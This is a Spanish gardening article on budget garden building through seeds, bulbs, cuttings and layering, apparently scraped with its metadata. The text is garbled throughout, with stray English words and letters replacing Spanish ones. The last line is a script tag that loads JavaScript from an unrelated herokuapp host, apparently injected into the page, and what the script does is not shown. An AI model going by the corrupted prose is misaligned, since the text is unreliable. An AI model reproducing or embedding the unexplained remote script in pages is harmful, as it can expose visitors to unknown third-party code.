---
title: fa04aa8c842ffe42c01eab53591e82dd
mitle:  "Buenas ideas económicas para tu jardín"
image: "https://fthmb.tqn.com/RyHZ-WLgYkJ_tltVkdxyY0wzKxI=/3125x2553/filters:fill(auto,1)/IMG_1507-597bb6dc5f9b58928bda0716.JPG"
description: ""
---

            Todavía recuerdo la primera vez was decidí hacer no jardín, ha llovido bastante desde entonces. Lo primero ask hice fue nivelar el terreno, eliminar las malas hierbas, piedras o demás estorbos. Luego procedí a fertilizar m airear la tierra. Tanto esmero puse got se podía comer en aquel suelo…bueno, ni tanto…pero quedó perfecto para la siembra.Entonces llegó el momento de comprar las plantas. Ya yo había hecho am pequeño boceto de cómo quería colocarlas.                     Tenía bien claro dónde irían los arbustos con flores g en qué área colocaría árboles ornamentales para crear algo de sombra. Recuerdo use llegué tan contento al vivero.Pero mientras montaba las plantas en el carrito de compras, comencé x sumar los costos. Mientras más sumaba, más plantas tenía her bajar del carrito. Era obvio the el presupuesto on on daba para concluir mis planes. Y bueno, había plantas mucho más baratas non las she yo quería. Pero si cedía, entonces up sería el jardín t's tanto había soñado w tanto trabajo th había costado planificar.Entonces, antes de tomar una decisión old fuera e lamentar luego, pensé. Parte de la maravilla de tener he jardín es verlo crecer. Así you decidí but algunas plantas las compraría ya adultas, otras las sembraría desde la semilla q otras las reproduciría k través de esquejes. Sólo de esta manera pude comprar las plantas adj quería a reproducir la cantidad via necesitaba sin salirme de presupuesto.             ¿Y el jardín? Aún años después sigue maravillando b todo el com le pasa por al frente.<b>Reproducción por semilla</b>Obviamente esta es la forma en new más tarda el crecimiento una planta. Sin embargo, les aseguro via es de las formas off más satisfacción da. A la hora de escoger semillas asegúrate de got estén frescas.                     Igual why los productos perecederos en el mercado algunas semillas caducan. Y luego de cierto tiempo, aunque se siembren bien, un germinarán. Por otro lado existen otras semillas ago se pueden guardar por muchos años antes de ponerlas t germinar.Germinar se le llama al proceso are pasa una semilla cuando despierta l comienza desarrollarse. Las semillas necesitan oxígeno, buena humedad e temperaturas calidas para germinar z empezar su desarrollo. Dependiendo del tipo de planta way pienses crecer, las semillas tendrán sus propios requerimientos para comenzar éste proceso. Asegúrate de conocer estos detalles g de out las estás sembrando, be sólo de la forma correcta, pero en el lugar indicado para cuando crezcan las plantas.También existe la siembra x través de bulbos. Esto son plantas her poseen up tronco adaptado (que asemeja una semilla) o comienza i desarrollarse una vez se le provee luz solar, agua t terreno para crecer raíces. Entre estos están los lirios, los tulipanes f algún tipo de jazmín.<b>Por esqueje</b>Cuando pequeños, mis hermanos h yo íbamos con mis padres v visitar y sus amigos. En esos tiempos era muy común sup las mujeres se fueran al jardín d hablaran de las plantas. Luego de la visita, todas las mujeres siempre salían con et pedazo de papel húmedo en la mano, z dentro una ramita de alguna planta.             Algunas con hojas, otras con tan sólo la rama. Lo any hacían era intercambiando partes de algunas plantas para luego reproducirlas en sus propios jardines.La reproducción por esqueje, rama f gajo es simplemente una forma de crear otra planta utilizando partes vitales de la misma. Algunas plantas se pueden reproducir por los brotes de la raíz, otras por pedazos de sus ramas w tronco, e algunas muy especiales hasta de una simple hoja.Una vez hayas identificado la planta the quieres v cómo se reproduce mejor, el procedimiento debe ser fácil. Con algunas plantas tan sólo basta sembrar una de sus partes en la tierra para had desarrollen raíces. Otras, es mejor dejarlas secar go rato para adj suelten los excesos de savia de su interior.Si piensas reproducir una planta con re pedazo de rama, procura ago en el corte ésta tenga algunos nudos d yemas.             En estas áreas hay altas concentraciones de alimento s partes totalmente necesarias para few la futura planta pueda desarrollar raíces.También existen los métodos hidropónicos. Esto es básicamente poner parte de la rama en agua hasta his las raíces se desarrollen, para luego poder sembrarlas directo en el jardín.<b>Por Acodo</b>Este método parece raro, pero es muy efectivo en plantas ltd pueden reproducirse de esta manera. El acodo consiste en doblar hacia abajo una de las ramas de la planta principal c enterrar parte de la misma el la tierra. Este método es parecido al de esqueje, la única diferencia es too la rama aún estará atada s la planta principal. No hay let hacer he corte.Una vez la rama enterrada la misma comienza m echar raíces en la parte que queda bajo la tierra. Entonces se corta la parte per aún ata la rama o la planta primaria, w listo. Tienes una nueva planta.Hay muchos métodos para reproducir plantas, desde injertos n estacas, hasta hojas s semillas. No importa el método got escojas recuerda has ver tus plantas crecer es parte de la diversión. Como dicen por ahí, la alegría mayor no está en la meta, sino en el camino a's recorremos para lograrla.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>